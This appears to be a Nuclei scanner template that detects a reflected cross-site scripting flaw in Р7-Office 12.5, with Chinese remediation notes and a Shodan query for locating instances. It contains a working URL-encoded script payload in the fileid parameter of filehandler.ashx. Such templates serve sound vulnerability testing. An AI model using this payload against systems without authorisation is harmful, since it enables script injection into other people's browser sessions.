id: p7-office-xss

info:
  name: Р7-Office 12.5 - 跨站脚本漏洞
  author: 0xpugal
  severity: medium
  description: Р7-Office 12.5 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Upgrade to the latest version to mitigate this vulnerability。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://bdu.fstec.ru/vul/2024-04635
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Р7-Офис"
  tags: p7office,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Can not convert id:'
          - '<script>alert(document.domain)</script>'
        condition: and

      - type: word
        part: content_type
        words:
          - 'text/html'

      - type: status
        status:
          - 500
